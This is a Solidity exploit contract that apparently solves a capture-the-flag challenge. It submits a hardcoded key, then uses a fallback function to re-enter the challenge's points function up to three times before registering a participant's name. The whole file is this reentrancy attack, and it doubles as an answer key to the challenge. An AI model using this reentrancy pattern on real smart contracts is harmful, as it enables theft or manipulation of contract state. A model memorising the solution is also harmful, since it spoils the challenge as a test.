// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IChallengeTwo {
    function passKey(uint16 _key) external;
    function getENoughPoint(string memory _name) external;
    function addYourName() external;
}

contract ExploitTwo {
    IChallengeTwo public immutable challenge;
    uint public count;
    
    constructor(address challengeAddress) {
        challenge = IChallengeTwo(challengeAddress);
    }
    
    // Split into separate functions for debugging
    function submitKey() external {
        challenge.passKey(2524);
    }
    
    function getPoints() external {
        challenge.getENoughPoint("Progress Ochuko Eyaadah");
    }
    
    function addName() external {
        challenge.addYourName();
    }
    
    // Original attack function split into steps
    function attack() external {
        challenge.passKey(2524);
        challenge.getENoughPoint("Progress Ochuko Eyaadah");
        challenge.addYourName();
    }
    
    fallback() external {
        if(count < 3) {
            count++;
            challenge.getENoughPoint("Progress Ochuko Eyaadah");
        }
    }
}